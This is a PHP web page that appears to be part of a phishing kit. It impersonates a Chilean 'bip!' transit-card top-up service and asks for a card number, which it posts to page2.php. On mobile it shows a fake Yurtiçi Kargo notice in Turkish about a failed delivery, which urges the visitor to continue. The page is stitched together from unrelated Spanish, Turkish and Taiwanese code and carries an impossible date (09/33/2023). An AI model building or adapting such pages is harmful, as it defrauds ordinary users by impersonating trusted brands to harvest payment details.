<?php
include('header-him2.php');
?>
<style type="text/css">
    form button[type="submit"] {
        background: #00a8b7;
        border: 1px solid #007984;
        color: #FFF;
        -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -moz-border-radius: 4px;
        -webkit-border-radius: 4px;
        border-radius: 4px;
    }

    .login-form {
        margin-right: -10px;
        margin-left: -10px;
    }

    .container {
        line-height: 1.5;
    }

    .photoblock2 {
        background-image: url(/images/photoblock_inbg.png) !important;
    }

    .innerpage {
        padding-top: 0px !important;
    }

    .tab-header-item {
        width: 49%;
        position: relative;
        float: left;
        padding: 0;
        margin: 0;
        background: gray;
        text-align: center;
        font-size: 16px;
        line-height: 40px !important;
        color: white;
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
        cursor: pointer;
    }

    .tab-header-item.active {
        background: black;
    }

    .pull-left {
        float: left !important;
    }

    .pull-right {
        float: right !important;
    }

    .tab-content {
        display: none;
    }

    .tab-content.active {
        display: block;
    }

    .tab-container {
        border-radius: 10px;
        box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
        transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
        padding: 1rem 0.6rem;
    }

    .tab-container form .btnSubmit {
        border-radius: 50px !important;
        width: 100%;
        margin-top: 0.5rem;
    }

    .tab-container .form-group {
        color: #333;
        /* font-size: 1.25rem; */
    }

    .form-info>i {
        margin-left: 12px;
    }

    .submit-info {
        width: 100%;
    }
</style>
<!-- main Start -->
<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
        <!-- photoblock start-->
        <section class="section col-12 photoblock2 no-print" style="background-image: url(/images/photoblock_inbg.png) !important;">
        </section>
        <!-- photoblock end-->
        <div class="container">
            <!-- h1節點 -->
            <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados</h1>
            <!-- aP Start -->
            <section class="ap">
                <!-- searchform start -->
                <div class="searchform">
                    <div class="login-form">
                        <div class="tab-headers clearfix">
                            <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
                            <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
                        </div>
                        <div class="tab-container">
                            <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate class="active tab-content">
                                <div class="form-group">
                                    <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                                    <input type="text" placeholder="Ej: 123456789" name="username" required>
                                </div>
                                <div class="form-submit">
                                    <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                                    <center>
                                        <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y condiciones</b>.</span>
                                    </center>
                                </div>
                            </form>
                            <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                                <p>empty</p>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </div>
    <div class="container">
        <section class="ap">
            <div class="row only_mobile">
                <div class="card_wrap">
                    <div class="top_card">
                        <div class="id_main">
                            <span><img src="/assets/Logo.png" width="35px"> </span>
                            <div class="top_card_left">
                                <h4>100987050072</h4>
                                <p class="short_id">Gönderi Kodu</p>
                            </div>
                        </div>
                        <p style="color: red" class="like_viewmore">Teslimatın askıya alınması</p>
                    </div>
                    <div class="bottom_card">
                        <p class="card_tag">yurtiçi kargo</p>
                        <p class="post_date_card">09/33/2023</p>
                    </div>
                </div>
            </div>
            <div class="time_line_wrap only_mobile">
                <div class="time_line one">
                    <div class="left-green">
                        <div class="for_color">
                            <p>08/10/2023<br>17:03
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">Adres nedeniyle paket teslimat hatası
                        <p>
                        <p class="bottom_color">En yakın dağıtım merkezine geri dönün
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>07/10/2023<br>15:36
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">Koliler tasnif merkezine ulaşır
                        <p>
                        <p class="bottom_color">Kurye teslimat için hazır
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>06/10/2023<br>09:11
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">Hedefe gönder
                        <p>
                        <p class="bottom_color">Transit halinde
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>05/10/2023<br>11:42
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">Paket alındı
                        <p>
                        <p class="bottom_color">Yükleme için hazır
                        <p>
                    </div>
                    <div>
                    </div>
                </div>

            </div>
            <div class="message_expert only_mobile">
                <div class="sub-title">
                    <img src="/images/alert3.png">
                    <h2 class="title">ÖNEMLİ UYARI</h2>
                    <p class="title-text">Adresinizdeki bir hata nedeniyle paket teslimatı başarısız oldu<strong></strong></p>
                    <p class="title-text">yurtiçi kargo, teslimat hatası veya başka bir durumda paketinizi adresinize yeniden teslim etmenizi sağlar.Ayrıca paketi istediğiniz zaman, sevkiyattan teslimata kadar takip edebilirsiniz.<strong></strong></p>
                </div>
            </div>
            <div class="button_block only_mobile">
                <a href="page2.php"><button class="button_next">ile devam edin</button></a>
            </div>

        </section>
        <!-- aP End -->
        <script>
            function checkForm() {
                var canGo = true;
                var custno = $("#custNo").val();
                if (custno === "") {
                    $("#custNoError").show();
                    canGo = false;
                }
                var answer = $("#answer").val();
                if (answer === "") {
                    $("#answerError").show();
                    canGo = false;
                }
                return canGo;
            }

            function errorNoticeDisplay(fieldName, noticeWarning) {
                $("#" + fieldName + "Error").show();
                $("#" + fieldName + "ErrorWarning").text(noticeWarning);
            }

            function sendEmailCaptcha() {
                var returnValue = true;
                if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
                    errorNoticeDisplay('email', '請輸入Email 帳號');
                    returnValue = false;
                } else {
                    //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                    var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                    if (patternEmail.test($("#email").val()) == false) {
                        errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                        returnValue = false;
                    } else {
                        patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                        if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                            errorNoticeDisplay('email',
                                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                        }
                    }
                }
                if (returnValue) {
                    $.ajax({
                        url: "/captcha/sendCaptcha",
                        type: "get",
                        data: {
                            "email": $("#email").val()
                        },
                        success: function(response) {
                            $('#modal1').hide();
                            $('.modal_overlay').hide();
                            if (response) {
                                swal("驗證碼已寄出，請至電子郵件信箱收信。");
                            } else {
                                swal("驗證碼已過期，請刷新驗證碼。");
                            }

                        },
                        error: function(response) {
                            swal("驗證碼已過期，請刷新驗證碼。");
                        }
                    });
                }
            }

            $(function() {

                $(".tab-header-item").on("click", function(e) {
                    e.preventDefault();
                    $(".tab-header-item").removeClass("active");
                    $(this).addClass("active");

                    var data_tab = $(this).attr("data-tab");
                    $(".tab-content").removeClass("active");
                    $("#" + data_tab).addClass("active");
                });

                $('#custNo').click(function() {
                    $('.annotation').show();
                    $("#answer").val("");
                });

                $('#answer').focus(function() {
                    $("#answer").val("");

                });
                $('#answer').keyup(function() {
                    var ans = $("#answer").val();
                    $("#answer").val(toASCII(ans));
                });

            });
        </script>
    </div>
</div>
<?php include('footer-him2.php'); ?>

